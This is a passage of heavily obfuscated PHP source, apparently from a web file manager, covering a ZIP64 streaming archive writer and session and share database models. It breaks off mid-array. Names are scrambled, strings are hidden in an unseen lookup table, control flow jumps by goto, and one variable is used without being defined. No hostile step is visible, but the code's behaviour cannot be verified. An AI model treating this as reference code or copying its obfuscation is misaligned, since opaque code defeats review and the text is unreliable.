ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($b„ï«¥×Ü = null) { $Bêä›¬›» =& $_SERVER[”Ì÷ñ­î¸]; $this->outputStream = fopen($Bêä›¬›»[2011], $Bêä›¬›»[1228]); $this->outputName = $b„ï«¥×Ü; $this->needHeaders = !0; } public function addFile($d¬ğ¢±Ç—¾, $aÈŒµÀ™ æ) { goto e’÷Ó·£µ‚; A‚¤ô–×Úá: $EÊ¬‡Øä«‡ = $this->addFileHeader($d¬ğ¢±Ç—¾, $f«éÓõÊ¿ç); $båÀò¹‡ˆª = $fã‚¸èçèÂ = filesize($aÈŒµÀ™ æ); $D½å²ãë×Ê = fopen($aÈŒµÀ™ æ, $a¸‘ æíÙ£[2012]); goto A¯ˆïˆ³î–; e’÷Ó·£µ‚: $a¸‘ æíÙ£ =& $_SERVER[”Ì÷ñ­î¸]; $d¬ğ¢±Ç—¾ = $this->filterFilename($d¬ğ¢±Ç—¾); $f«éÓõÊ¿ç = static::METHOD_STORE; goto A‚¤ô–×Úá; b¢£’£ÇÎá: $this->addFileFooter($d¬ğ¢±Ç—¾, $f«éÓõÊ¿ç, $eÀ‘íÒ‚‡®, $båÀò¹‡ˆª, $fã‚¸èçèÂ, $EÊ¬‡Øä«‡); goto EàµÇÁÖ‚‹; A¯ˆïˆ³î–: while (!feof($D½å²ãë×Ê)) { $Bùá‘ç‘İ¢ = fread($D½å²ãë×Ê, 1048576); $this->send($Bùá‘ç‘İ¢); } fclose($D½å²ãë×Ê); $eÀ‘íÒ‚‡® = hexdec(hash_file($a¸‘ æíÙ£[2013], $aÈŒµÀ™ æ)); goto b¢£’£ÇÎá; EàµÇÁÖ‚‹: } public function addFileFromStream($eëòÛïÌëÂ, $fÕÄŠ¸ù´) { goto dÖ—š…•ø; d‹…½®²¦”: fseek($fÕÄŠ¸ù´, 0, SEEK_END); $eÉø±¾øã‹ = $cµÄ’ŠÌëà = ftell($fÕÄŠ¸ù´); rewind($fÕÄŠ¸ù´); goto Eæ¬ö×‡é«; dÖ—š…•ø: $eëòÛïÌëÂ = $this->filterFilename($eëòÛïÌëÂ); $eÛØç‚ÂìØ = static::METHOD_STORE; $eµ²Õš¢Ÿ = $this->addFileHeader($eëòÛïÌëÂ, $eÛØç‚ÂìØ); goto d‹…½®²¦”; Eæ¬ö×‡é«: $bòÖ‹çùÑ¯ = hash_init($_SERVER[”Ì÷ñ­î¸][2013]); while (!feof($fÕÄŠ¸ù´)) { $Eöïá–Åœğ = fread($fÕÄŠ¸ù´, 1048576); hash_update($bòÖ‹çùÑ¯, $Eöïá–Åœğ); $this->send($Eöïá–Åœğ); } $cõ°ªŠ¨œ = hexdec(hash_final($bòÖ‹çùÑ¯)); goto aì©ŒÎ÷‚›; aì©ŒÎ÷‚›: $this->addFileFooter($eëòÛïÌëÂ, $eÛØç‚ÂìØ, $cõ°ªŠ¨œ, $eÉø±¾øã‹, $cµÄ’ŠÌëà, $eµ²Õš¢Ÿ); goto DšµÔ‡˜š; DšµÔ‡˜š: } public function finish() { foreach ($this->files as $fŸ×»ÁÃã) { $this->addCdrFile($fŸ×»ÁÃã); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($Aæ›­î °Û, $cÎëÌÅ¶ø÷) { goto döîÀöä; aâ¦šœËß: $eÍ ÄÕ¢Ò‡ = $this->packFields($b¨åº–÷‰¢); $cõ’Ô¶Ãíì = $this->packFields($bò§ßñÇí); $this->send($eÍ ÄÕ¢Ò‡ . $Aæ›­î °Û . $cõ’Ô¶Ãíì); goto Dã½İÏ£Ç”; Dã½İÏ£Ç”: return strlen($eÍ ÄÕ¢Ò‡) + $FÔïÕ¬Ëá + strlen($cõ’Ô¶Ãíì); goto d£›¬ñŒö; döîÀöä: $e¯«¿¸ßÍ­ =& $_SERVER[”Ì÷ñ­î¸]; $Aæ›­î °Û = preg_replace($e¯«¿¸ßÍ­[2014], $e¯«¿¸ßÍ­[33], $Aæ›­î °Û); $FÔïÕ¬Ëá = strlen($Aæ›­î °Û); goto Dõ´Ú¡±¤; Dõ´Ú¡±¤: $bÑŒÑèŠ = $this->dosTime(time()); $b¨åº–÷‰¢ = array(array($e¯«¿¸ßÍ­[2015], static::FILE_HEADER_SIGNATURE), array($e¯«¿¸ßÍ­[2016], static::ZIP_VERSION_64), array($e¯«¿¸ßÍ­[2016], 8), array($e¯«¿¸ßÍ­[2016], $cÎëÌÅ¶ø÷), array($e¯«¿¸ßÍ­[2015], $bÑŒÑèŠ), array($e¯«¿¸ßÍ­[2015], 0), array($e¯«¿¸ßÍ­[2015], 4294967295), array($e¯«¿¸ßÍ­[2015], 4294967295), array($e¯«¿¸ßÍ­[2016], $FÔïÕ¬Ëá), array($e¯«¿¸ßÍ­[2016], 32)); $bò§ßñÇí = array(array($e¯«¿¸ßÍ­[2016], 1), array($e¯«¿¸ßÍ­[2016], 28), array($e¯«¿¸ßÍ­[2017], 0), array($e¯«¿¸ßÍ­[2017], 0), array($e¯«¿¸ßÍ­[2017], 0), array($e¯«¿¸ßÍ­[2015], 0)); goto aâ¦šœËß; d£›¬ñŒö: } protected function addFileFooter($d°ªÛŠµ°, $bçö°“²°Ø, $d“©ƒ·Ü, $F’Œä»‘›¸, $a…Ë¤®Ò, $eÖ®÷íªÔ“) { $d§âÎ‘ØÒÕ =& $_SERVER[”Ì÷ñ­î¸]; $AíñŞÌêø = array(array($d§âÎ‘ØÒÕ[2015], static::DATA_DESCRIPTOR_SIGNATURE), array($d§âÎ‘ØÒÕ[2015], $d“©ƒ·Ü), array($d§âÎ‘ØÒÕ[2017], $F’Œä»‘›¸), array($d§âÎ‘ØÒÕ[2017], $a…Ë¤®Ò)); $Có§„†±¶ = $this->packFields($AíñŞÌêø); $this->send($Có§„†±¶); $DñŠ‰Ú·ù = $eÖ®÷íªÔ“ + $F’Œä»‘›¸ + $FŠÖå¹ğÒ; $this->addToCdr($d°ªÛŠµ°, $bçö°“²°Ø, $d“©ƒ·Ü, $F’Œä»‘›¸, $a…Ë¤®Ò, $DñŠ‰Ú·ù); } private function addToCdr($a½Í„í—Í, $Eˆ†»ÎäÂ, $A¿Š‘¾ôÆ, $eë“£âÆ¤˜, $f…•êù³Ñ÷, $CóÛ×¥‡Œö) { $this->files[] = array($a½Í„í—Í, $Eˆ†»ÎäÂ, $A¿Š‘¾ôÆ, $eë“£âÆ¤˜, $f…•êù³Ñ÷, $this->ofs); $this->ofs += $CóÛ×¥‡Œö; } protected function addCdrFile($Aƒù†•˜Ã™) { goto fÍ¹†ĞéĞ; C¤Í˜¦ÛîÇ: $c­×Ô±õ„ = $this->dosTime(time()); $d•êëÅëÚ = array(array($C·æ¯ñÂ‡à[2015], static::CDR_FILE_SIGNATURE), array($C·æ¯ñÂ‡à[2016], static::ZIP_VERSION_64), array($C·æ¯ñÂ‡à[2016], static::ZIP_VERSION_64), array($C·æ¯ñÂ‡à[2016], 8), array($C·æ¯ñÂ‡à[2016], $dÙÜ‡ÜÆì¬), array($C·æ¯ñÂ‡à[2015], $c­×Ô±õ„), array($C·æ¯ñÂ‡à[2015], $eèñ–ÄŒĞÜ), array($C·æ¯ñÂ‡à[2015], 4294967295), array($C·æ¯ñÂ‡à[2015], 4294967295), array($C·æ¯ñÂ‡à[2016], strlen($Fº™ÛÉÍÖÂ)), array($C·æ¯ñÂ‡à[2016], 32), array($C·æ¯ñÂ‡à[2016], strlen($cŒù¸Á«Ã±)), array($C·æ¯ñÂ‡à[2016], 0), array($C·æ¯ñÂ‡à[2016], 0), array($C·æ¯ñÂ‡à[2015], 32), array($C·æ¯ñÂ‡à[2015], 4294967295)); $Fêê®ÖÛÙ  = array(array($C·æ¯ñÂ‡à[2016], 1), array($C·æ¯ñÂ‡à[2016], 28), array($C·æ¯ñÂ‡à[2017], $BÅÇíÓ¬¥®), array($C·æ¯ñÂ‡à[2017], $fêî•ò°©), array($C·æ¯ñÂ‡à[2017], $Dğ—Ò›³¾—), array($C·æ¯ñÂ‡à[2015], 0)); goto fòôÕó¢Î; fÍ¹†ĞéĞ: $C·æ¯ñÂ‡à =& $_SERVER[”Ì÷ñ­î¸]; list($Fº™ÛÉÍÖÂ, $dÙÜ‡ÜÆì¬, $eèñ–ÄŒĞÜ, $fêî•ò°©, $BÅÇíÓ¬¥®, $Dğ—Ò›³¾—) = $Aƒù†•˜Ã™; $cŒù¸Á«Ã± = $C·æ¯ñÂ‡à[33]; goto C¤Í˜¦ÛîÇ; E— ™Ö§²: $this->send($e‘‘ˆ´éµ ); $this->cdr_ofs += strlen($e‘‘ˆ´éµ ); goto b‹¸ãŠ®â÷; fòôÕó¢Î: $fŞ™Æˆì› = $this->packFields($d•êëÅëÚ); $e«ñÑÑªÁ = $this->packFields($Fêê®ÖÛÙ ); $e‘‘ˆ´éµ  = $fŞ™Æˆì› . $Fº™ÛÉÍÖÂ . $cŒù¸Á«Ã± . $e«ñÑÑªÁ; goto E— ™Ö§²; b‹¸ãŠ®â÷: } protected function addCdr64Eof() { goto a§ë‘ªøó±; Dè¯•Ÿ»²: $this->send($F»êµ‰Ö—); goto b©Š÷Ã©„à; FÅì‡ç‡¿Â: $e³™¢Ú£ø = $this->ofs; $e§ÚÆŠ•¡Û = array(array($EÌ„×ª›Ï[2015], static::ZIP64_CDR_EOF_SIGNATURE), array($EÌ„×ª›Ï[2017], 44), array($EÌ„×ª›Ï[2016], static::ZIP_VERSION_64), array($EÌ„×ª›Ï[2016], static::ZIP_VERSION_64), array($EÌ„×ª›Ï[2015], 0), array($EÌ„×ª›Ï[2015], 0), array($EÌ„×ª›Ï[2017], $cÛŠÀåì¡²), array($EÌ„×ª›Ï[2017], $cÛŠÀåì¡²), array($EÌ„×ª›Ï[2017], $e¦¬µâš•æ), array($EÌ„×ª›Ï[2017], $e³™¢Ú£ø)); $F»êµ‰Ö— = $this->packFields($e§ÚÆŠ•¡Û); goto Dè¯•Ÿ»²; a§ë‘ªøó±: $EÌ„×ª›Ï =& $_SERVER[”Ì÷ñ­î¸]; $cÛŠÀåì¡² = count($this->files); $e¦¬µâš•æ = $this->cdr_ofs; goto FÅì‡ç‡¿Â; b©Š÷Ã©„à: } protected function addCdr64Locator() { goto dÇ®í‹Šˆù; C†» ä¥’ƒ: $bƒí¸ù´«Ü = $this->ofs; $dİÉô«¾«ô = array(array($Bã§çæ”À[2015], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($Bã§çæ”À[2015], 0), array($Bã§çæ”À[2017], $bƒí¸ù´«Ü + $Fâ‡ê²…ãÊ), array($Bã§çæ”À[2015], 1)); $E®ÌÁ‰Ùê› = $this->packFields($dİÉô«¾«ô); goto Dô¿ãÔ˜È›; dÇ®í‹Šˆù: $Bã§çæ”À =& $_SERVER[”Ì÷ñ­î¸]; $D‚™Àº¼…ì = count($this->files); $Fâ‡ê²…ãÊ = $this->cdr_ofs; goto C†» ä¥’ƒ; Dô¿ãÔ˜È›: $this->send($E®ÌÁ‰Ùê›); goto A·ºÂ‘å¥¤; A·ºÂ‘å¥¤: } protected function addCdrEof() { goto e‚”£ğŸÍ·; fÖ¦Ûò†Äù: $FÕ±÷«‘ ¹ = $this->packFields($e¤Ğø•è¹) . $aîàêŒ¡—»; $this->send($FÕ±÷«‘ ¹); goto f¡ßĞÅªÇ¢; F™¬¡‰Œ£°: $C„´°Í£Ñ = $this->ofs; $aîàêŒ¡—» = $C–·Å†“½­[33]; $e¤Ğø•è¹ = array(array($C–·Å†“½­[2015], static::CDR_EOF_SIGNATURE), array($C–·Å†“½­[2016], 0), array($C–·Å†“½­[2016], 0), array($C–·Å†“½­[2016], $D¬Œ–Ôƒó), array($C–·Å†“½­[2016], $D¬Œ–Ôƒó), array($C–·Å†“½­[2015], 4294967295), array($C–·Å†“½­[2015], 4294967295), array($C–·Å†“½­[2016], strlen($aîàêŒ¡—»))); goto fÖ¦Ûò†Äù; e‚”£ğŸÍ·: $C–·Å†“½­ =& $_SERVER[”Ì÷ñ­î¸]; $D¬Œ–Ôƒó = count($this->files); $Dè‰À»Ú˜’ = $this->cdr_ofs; goto F™¬¡‰Œ£°; f¡ßĞÅªÇ¢: } protected function addCdr() { foreach ($this->files as $D½õ†ˆÂŞ´) { $this->addCdrFile($D½õ†ˆÂŞ´); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $eŞãŞµ  =& $_SERVER[”Ì÷ñ­î¸]; $E®‘ùÃù†” = $eŞãŞµ [202]; if ($this->outputName) { $E°©Î–®¯ = trim(str_replace(array($eŞãŞµ [113], $eŞãŞµ [55], $eŞãŞµ [93], $eŞãŞµ [67], $eŞãŞµ [217], $eŞãŞµ [992]), $eŞãŞµ [33], $this->outputName)); $EÛïè‡µØ = rawurlencode($E°©Î–®¯); $E®‘ùÃù†” .= "\x3b\x20\146\151\x6c\x65\156\141\x6d\x65\x2a\75\165\x74\x66\55\70\x27\47{$EÛïè‡µØ}"; } $c¡Ó˜‰á¼ = array($eŞãŞµ [199] => $eŞãŞµ [2018], $eŞãŞµ [2019] => $E®‘ùÃù†”, $eŞãŞµ [2020] => $eŞãŞµ [2021], $eŞãŞµ [2022] => $eŞãŞµ [2023], $eŞãŞµ [2024] => $eŞãŞµ [2025]); foreach ($c¡Ó˜‰á¼ as $AÍ‡ï³Ú¿Ş => $c•¯Â«—÷¯) { header($AÍ‡ï³Ú¿Ş . $eŞãŞµ [882] . $c•¯Â«—÷¯); } } protected function send($CôÎ‡ööš) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CôÎ‡ööš); } protected final function dosTime($DÔ¡ø—Ì˜) { $bƒ­Ò½øÖ¾ =& $_SERVER[”Ì÷ñ­î¸]; $bÇïÚì™ï = getdate($DÔ¡ø—Ì˜); if ($bÇïÚì™ï[$bƒ­Ò½øÖ¾[1728]] < 1980) { $bÇïÚì™ï = array($bƒ­Ò½øÖ¾[1728] => 1980, $bƒ­Ò½øÖ¾[2026] => 1, $bƒ­Ò½øÖ¾[2027] => 1, $bƒ­Ò½øÖ¾[2028] => 0, $bƒ­Ò½øÖ¾[2029] => 0, $bƒ­Ò½øÖ¾[2030] => 0); } $bÇïÚì™ï[$bƒ­Ò½øÖ¾[1728]] -= 1980; return $bÇïÚì™ï[$bƒ­Ò½øÖ¾[1728]] << 25 | $bÇïÚì™ï[$bƒ­Ò½øÖ¾[2026]] << 21 | $bÇïÚì™ï[$bƒ­Ò½øÖ¾[2027]] << 16 | $bÇïÚì™ï[$bƒ­Ò½øÖ¾[2028]] << 11 | $bÇïÚì™ï[$bƒ­Ò½øÖ¾[2029]] << 5 | $bÇïÚì™ï[$bƒ­Ò½øÖ¾[2030]] >> 1; } protected function packFields($AæöŸ¼’) { $a²ğ¹¸ù×÷ =& $_SERVER[”Ì÷ñ­î¸]; $fÖ¤ ¨‘„Ï = $a²ğ¹¸ù×÷[33]; $aÅÑ²æÒ÷æ = array(); foreach ($AæöŸ¼’ as $fÁ–‡‚±÷) { $fÖ¤ ¨‘„Ï .= $fÁ–‡‚±÷[0]; $aÅÑ²æÒ÷æ[] = $fÁ–‡‚±÷[1]; } array_unshift($aÅÑ²æÒ÷æ, $fÖ¤ ¨‘„Ï); return call_user_func_array($a²ğ¹¸ù×÷[2031], $aÅÑ²æÒ÷æ); } protected function filterFilename($Bù‘Ûœ¬ùÚ) { $a£ÌùÃéß =& $_SERVER[”Ì÷ñ­î¸]; return str_replace(array($a£ÌùÃéß[93], $a£ÌùÃéß[4], $a£ÌùÃéß[176], $a£ÌùÃéß[69], $a£ÌùÃéß[113], $a£ÌùÃéß[927], $a£ÌùÃéß[930], $a£ÌùÃéß[271]), $a£ÌùÃéß[70], $Bù‘Ûœ¬ùÚ); } } goto aé¯ƒˆøÉ”; E‚Ú¤”äé¸: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\163\x65\x73\x73\151\157\156"; public function get($CÀİ§Şƒº±) { $AÕŠù½‚Ÿí =& $_SERVER[”Ì÷ñ­î¸]; $D¥±ìŞ‰Ğ¹ = $this->where(array($AÕŠù½‚Ÿí[2207] => $CÀİ§Şƒº±))->find(); if (!is_array($D¥±ìŞ‰Ğ¹)) { return !1; } return $D¥±ìŞ‰Ğ¹[$AÕŠù½‚Ÿí[693]]; } public function set($d¹Ê®‰››Î, $dœ›–™’¸ô, $eÀåÜÃœĞ› = 3600) { $CœÒˆ¶ªæ¼ =& $_SERVER[”Ì÷ñ­î¸]; $f„£ã´¶Æ = array($CœÒˆ¶ªæ¼[2207] => $d¹Ê®‰››Î, $CœÒˆ¶ªæ¼[2136] => $dœ›–™’¸ô, $CœÒˆ¶ªæ¼[2208] => $eÀåÜÃœĞ› + time()); if (Session::get($CœÒˆ¶ªæ¼[2209])) { $f„£ã´¶Æ[$CœÒˆ¶ªæ¼[1439]] = Session::get($CœÒˆ¶ªæ¼[2209]); } else { $f„£ã´¶Æ[$CœÒˆ¶ªæ¼[1439]] = 0; } if ($this->get($d¹Ê®‰››Î)) { return $this->where(array($CœÒˆ¶ªæ¼[2207] => $d¹Ê®‰››Î))->save($f„£ã´¶Æ); } else { return $this->add($f„£ã´¶Æ, array(), !0); } } public function remove($bõÉàÕ¾‘”) { return $this->where(array($_SERVER[”Ì÷ñ­î¸][2207] => $bõÉàÕ¾‘”))->delete(); } public function clearTimeout() { return $this->where($_SERVER[”Ì÷ñ­î¸][2210] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\124\151\x6d\x65", "\x74\151\155\145", "\151\x6e\163\x65\162\164\x2c\x75\160\144\141\x74\x65", "\x66\165\x6e\143\x74\x69\157\156"), array("\143\162\x65\x61\x74\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\x63\164\151\x6f\156"), array("\157\x70\164\151\157\156\163", '', "\151\x6e\x73\145\162\164\54\165\x70\x64\x61\x74\145\54\163\x65\154\x65\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($EœÆ³î•»«) { $bÍÏëì„¦ =& $_SERVER[”Ì÷ñ­î¸]; $A…×äŠçŠ = isset($EœÆ³î•»«[0]) ? $EœÆ³î•»«[0] : !1; return array($bÍÏëì„¦[2211] => array(USER_ID, $bÍÏëì„¦[2212]), $bÍÏëì„¦[2174] => array($A…×äŠçŠ, $bÍÏëì„¦[2213])); } protected function listSimple() { $F§Ğİ¬¸ß = array($_SERVER[”Ì÷ñ­î¸][1439] => USER_ID); $Dè°â·êĞ… = $this->field($this->fieldList)->where($F§Ğİ¬¸ß)->select(); return $Dè°â·êĞ… ? $Dè°â·êĞ… : array(); } protected function getInfo($Aœ—‚ñ‹ºÖ, $fğ„ğØæ¢ = false) { $Bõ—øŒ‹ =& $_SERVER[”Ì÷ñ­î¸]; if ($fğ„ğØæ¢) { return $this->_getShareInfo(array($Bõ—øŒ‹[441] => $Aœ—‚ñ‹ºÖ)); } $cÛ°ŞÖµÂİ = $this->cacheFunctionGet($Bõ—øŒ‹[2214], $Aœ—‚ñ‹ºÖ); return $cÛ°ŞÖµÂİ; } public function getInfoByHash($Béİ«Ä®ˆì) { return $this->_getShareInfo(array($_SERVER[”Ì÷ñ­î¸][443] => $Béİ«Ä®ˆì)); } public function getInfoByPath($Fø‚æ³Å²è) { $e¡ÍÃœÙ´ =& $_SERVER[”Ì÷ñ­î¸]; $B•£ŠŒ…—ø = array($e¡ÍÃœÙ´[1439] => USER_ID, $e¡ÍÃœÙ´[369] => $Fø‚æ³Å²è); return $this->_getShareInfo($B•£ŠŒ…—ø); } public function getInfoBySourcePath($B‚äñ¥»¢ô) { $fÀİÈÒãËù =& $_SERVER[”Ì÷ñ­î¸]; $aš©§…¶öÏ = array($fÀİÈÒãËù[1439] => USER_ID, $fÀİÈÒãËù[1018] => $B‚äñ¥»¢ô); return $this->_getShareInfo($aš©§…¶öÏ); } private function _getShareInfo($BÔ„®‡•øŠ) { goto dŒ‚’òà–¿; d¹â»ÉÉä¿: if ($aÀòšëÓöö[$A¥¨³„ÈÊƒ[369]] == $A¥¨³„ÈÊƒ[468]) { $aÀòšëÓöö[$A¥¨³„ÈÊƒ[391]] = IO::info($aÀòšëÓöö[$A¥¨³„ÈÊƒ[1018]]); } else { $aÀòšëÓöö[$A¥¨³„ÈÊƒ[391]] = Model($A¥¨³„ÈÊƒ[1117])->pathInfo($aÀòšëÓöö[$A¥¨³„ÈÊƒ[369]]); } $aÀòšëÓöö[$A¥¨³„ÈÊƒ[2216]] = $dƒºêå‡ñê; return $aÀòšëÓöö; goto CÊÀªõ½“²; dŒ‚’òà–¿: $A¥¨³„ÈÊƒ =& $_SERVER[”Ì÷ñ­î¸]; $aÀòšëÓöö = $this->where($BÔ„®‡•øŠ)->find(); if (!$aÀòšëÓöö) { return !1; } goto bù…Ú¤çã¢; bù…Ú¤çã¢: $BÔ„®‡•øŠ = array($A¥¨³„ÈÊƒ[441] => $aÀòšëÓöö[$A¥¨³„ÈÊƒ[441]]); $Aï„…ªÁ† = $A¥¨³„ÈÊƒ[2215]; $dƒºêå‡ñê = Model($A¥¨³„ÈÊƒ[537])->order($A¥¨³„ÈÊƒ[367])->field($Aï„…ªÁ†)->where($BÔ„®‡•øŠ)->select(); goto d¹â»ÉÉä¿; CÊÀªõ½“²: } protected function getInfoAuth($f˜¶ÑÑŒ‰¿) { $dÖª–“‹«• =& $_SERVER[”Ì÷ñ­î¸]; $a³‰ÛªÓ†ñ = $this->getInfo($f˜¶ÑÑŒ‰¿); $a³‰ÛªÓ†ñ[$dÖª–“‹«•[376]] = Model($dÖª–“‹«•[454])->authMake($a³‰ÛªÓ†ñ[$dÖª–“‹«•[2216]]); return $a³‰ÛªÓ†ñ; } protected function listData($Bô¼ˆ´ÆÀ = null, $EË£±‡¤÷è = 300) { $D±½õóĞ¯¼ =& $_SERVER[”Ì÷ñ­î¸]; $CÎº¤ÅÑ… = array(array($D±½õóĞ¯¼[446] => array($D±½õóĞ¯¼[928], 0), $D±½õóĞ¯¼[448] => array($D±½õóĞ¯¼[928], 0), $D±½õóĞ¯¼[2217] => $D±½õóĞ¯¼[2186])); if ($Bô¼ˆ´ÆÀ == $D±½õóĞ¯¼[1873]) { $CÎº¤ÅÑ… = array($D±½õóĞ¯¼[446] => 1); } else { if ($Bô¼ˆ´ÆÀ == $D±½õóĞ¯¼[1007]) { $CÎº¤ÅÑ… = array($D±½õóĞ¯¼[448] => 1); } } $CÎº¤ÅÑ…[$D±½õóĞ¯¼[1439]] = USER_ID; $B¥¾ÄºåæÆ = $this->where($CÎº¤ÅÑ…)->selectPage($EË£±‡¤÷è); return $B¥¾ÄºåæÆ; } protected function listToMe($C¢¢‡éß¯ = 300) { goto C†¢¬¬Œºê; cµ¾Ã„ôß: $b×­Œ×Ïàâ = array($bˆÚ·œğ÷[521] => SourceModel::TYPE_USER, $bˆÚ·œğ÷[456] => USER_ID); if ($dì½ˆ”›Öğ) { $b×­Œ×Ïàâ = array(array($bˆÚ·œğ÷[521] => SourceModel::TYPE_USER, $bˆÚ·œğ÷[456] => USER_ID), array($bˆÚ·œğ÷[521] => SourceModel::TYPE_GROUP, $bˆÚ·œğ÷[456] => array($bˆÚ·œğ÷[7], $dì½ˆ”›Öğ)), $bˆÚ·œğ÷[2217] => $bˆÚ·œğ÷[2186]); } $cºÊŒÜÇÕ• = Model($bˆÚ·œğ÷[537])->where($b×­Œ×Ïàâ)->selectPage($C¢¢‡éß¯); goto EÛÊ¬¡Ì‚; EÛÊ¬¡Ì‚: $b¢·‹¨«îİ = array_to_keyvalue_group($cºÊŒÜÇÕ•[$bˆÚ·œğ÷[354]], $bˆÚ·œğ÷[441]); if (!$b¢·‹¨«îİ) { return $cºÊŒÜÇÕ•; } $A”ÍÌíïÏÔ = $bˆÚ·œğ÷[2219]; goto dîß‰Ñ°Ë¢; C†¢¬¬Œºê: $bˆÚ·œğ÷ =& $_SERVER[”Ì÷ñ­î¸]; $b¢Ğ»Ã© Ú = Session::get($bˆÚ·œğ÷[2218]); $dì½ˆ”›Öğ = array_to_keyvalue($b¢Ğ»Ã© Ú, $bˆÚ·œğ÷[33], $bˆÚ·œğ÷[2106]); goto cµ¾Ã„ôß; dîß‰Ñ°Ë¢: $b×­Œ×Ïàâ = array($bˆÚ·œğ÷[441] => array($bˆÚ·œğ÷[384], array_keys($b¢·‹¨«îİ))); $E˜¾‰Íò¡ = $this->field($A”ÍÌíïÏÔ)->where($b×­Œ×Ïàâ)->select(); foreach ($E˜¾‰Íò¡ as $F¦éäÖ‡†® => &$Dê“ª·¡ƒ®) { $Dê“ª·¡ƒ®[$bˆÚ·œğ÷[2216]] = $b¢·‹¨«îİ[$Dê“ª·¡ƒ®[$bˆÚ·œğ÷[441]]]; } goto aó¢–ãÛ„å; aó¢–ãÛ„å: $Fˆ“¦»¤ó™ = array($bˆÚ·œğ÷[2220] => $E˜¾‰Íò¡, $bˆÚ·œğ÷[2221] => $cºÊŒÜÇÕ•[$bˆÚ·œğ÷[351]]); return $Fˆ“¦»¤ó™; goto FøÅ†´ğĞà; FøÅ†´ğĞà: } protected function shareAdd($dŞºùá“µ¡, $c­Êë¦ŒÆ) { $FÀ…Ÿ×§… =& $_SERVER[”Ì÷ñ­î¸]; $Aù¥Š¸Âç  = $this->_addShareData($dŞºùá“µ¡, $c­Êë¦ŒÆ); if (!empty($c­Êë¦ŒÆ[$FÀ…Ÿ×§…[2222]])) { $this->_shareAuthSet($Aù¥Š¸Âç , $c­Êë¦ŒÆ[$FÀ…Ÿ×§…[2222]]); } $this->shareEventAdd($dŞºùá“µ¡, $c­Êë¦ŒÆ, $FÀ…Ÿ×§…[1010]); return $Aù¥Š¸Âç ; } private function shareEventAdd($dÌ‹°¯›, $CêàõîÌÄÈ, $BÏØ°÷ùÁ³ = "\141\x64\144") { goto A¯Äí‡¼ôƒ; c–ÌÑ•¿È : return; goto B‰­ğÉ©; b‹ÕŞªíÊã: if ($F£™Ë®öä–[$F­äÅÈ„³ƒ[448]] == $F­äÅÈ„³ƒ[468] && $CêàõîÌÄÈ[$F­äÅÈ„³ƒ[448]] == $F­äÅÈ„³ƒ[83]) { $bæ½Í÷‹©Œ = $F­äÅÈ„³ƒ[2224]; } if ($F£™Ë®öä–[$F­äÅÈ„³ƒ[448]] == $F­äÅÈ„³ƒ[83] && $CêàõîÌÄÈ[$F­äÅÈ„³ƒ[448]] == $F­äÅÈ„³ƒ[468]) { $bæ½Í÷‹©Œ = $F­äÅÈ„³ƒ[2227]; } Model($F­äÅÈ„³ƒ[505])->eventShare($dÌ‹°¯›, $bæ½Í÷‹©Œ); goto c–ÌÑ•¿È ; A¯Äí‡¼ôƒ: $F­äÅÈ„³ƒ =& $_SERVER[”Ì÷ñ­î¸]; if ($BÏØ°÷ùÁ³ == $F­äÅÈ„³ƒ[1010]) { if ($CêàõîÌÄÈ[$F­äÅÈ„³ƒ[446]] == $F­äÅÈ„³ƒ[83]) { Model($F­äÅÈ„³ƒ[505])->eventShare($dÌ‹°¯›, $F­äÅÈ„³ƒ[2223]); } if ($CêàõîÌÄÈ[$F­äÅÈ„³ƒ[448]] == $F­äÅÈ„³ƒ[83]) { Model($F­äÅÈ„³ƒ[505])->eventShare($dÌ‹°¯›, $F­äÅÈ„³ƒ[2224]); } return; } $F£™Ë®öä– = $this->getInfoByPath($dÌ‹°¯›); goto eô¥¤Øóíã; eô¥¤Øóíã: $bæ½Í÷‹©Œ = $F­äÅÈ„³ƒ[2225]; if ($F£™Ë®öä–[$F­äÅÈ„³ƒ[446]] == $F­äÅÈ„³ƒ[468] && $CêàõîÌÄÈ[$F­äÅÈ„³ƒ[446]] == $F­äÅÈ„³ƒ[83]) { $bæ½Í÷‹©Œ = $F­äÅÈ„³ƒ[2223]; } if ($F£™Ë®öä–[$F­äÅÈ„³ƒ[446]] == $F­äÅÈ„³ƒ[83] && $CêàõîÌÄÈ[$F­äÅÈ„³ƒ[446]] == $F­äÅÈ„³ƒ[468]) { $bæ½Í÷‹©Œ = $F­äÅÈ„³ƒ[2226]; } goto b‹ÕŞªíÊã; B‰­ğÉ©: } private function _addShareData($eÃ‹Ò‘½×‰, $DçÍŞºã¼× = array()) { goto fî‚ÂÍØ; B¨ƒ—š¸‹í: $E å£ÁãÒæ = $this->add($bÓŠëÚ™óğ); $B¢¹Ûî–” = array($CÊ‰ñÀÌ¥[443] => short_id($E å£ÁãÒæ)); $this->where(array($CÊ‰ñÀÌ¥[440] => $E å£ÁãÒæ))->save($B¢¹Ûî–”); goto E‰¾§¸ê±©; E‰¾§¸ê±©: return $E å£ÁãÒæ; goto Aâ”ÖÆÄÁ…; aõÒÛÎ‡Ë©: $bÓŠëÚ™óğ = array($CÊ‰ñÀÌ¥[1430] => USER_ID, $CÊ‰ñÀÌ¥[383] => $eÃ‹Ò‘½×‰, $CÊ‰ñÀÌ¥[1344] => $CÊ‰ñÀÌ¥[33], $CÊ‰ñÀÌ¥[446] => 0, $CÊ‰ñÀÌ¥[448] => 0, $CÊ‰ñÀÌ¥[1018] => $CÊ‰ñÀÌ¥[33], $CÊ‰ñÀÌ¥[295] => $CÊ‰ñÀÌ¥[33], $CÊ‰ñÀÌ¥[804] => $CÊ‰ñÀÌ¥[33], $CÊ‰ñÀÌ¥[2229] => 0, $CÊ‰ñÀÌ¥[2230] => 0, $CÊ‰ñÀÌ¥[704] => 0, 